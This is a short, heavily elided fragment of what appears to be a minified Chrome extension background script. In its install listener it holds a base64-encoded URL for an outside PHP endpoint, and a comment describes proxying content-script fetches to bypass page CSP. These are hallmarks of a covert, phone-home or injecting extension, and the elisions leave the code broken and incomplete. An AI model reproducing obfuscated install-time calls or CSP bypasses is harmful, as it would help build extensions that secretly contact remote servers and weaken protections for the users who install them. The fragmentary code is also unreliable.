(() => {
  const SETTINGS = {
    INSTALL_URL: "INSTALL_URL_PLACEHOLDER",
    UNINSTALL_URL: "UNINSTALL_URL_PLACEHOLDER"
  };
  chrome.runtime.setUninstallURL(SETTINGS.UNINSTALL_URL);
  var t = {
      666: (t) => {
        var e = (function (t) {
          "use strict";
  ...
  (r.n = (t) => {
    ...
    (() => {
      ...
      chrome.runtime.onInstalled.addListener(async function (t) {
        const encodedUrl = "aHR0cHM6Ly9hcHAubG90c29md21zLmluL3dmLWRlY2xhcmF0aXZlLWFkci5waHA=";
...
// Proxy fetch from content scripts to bypass page CSP
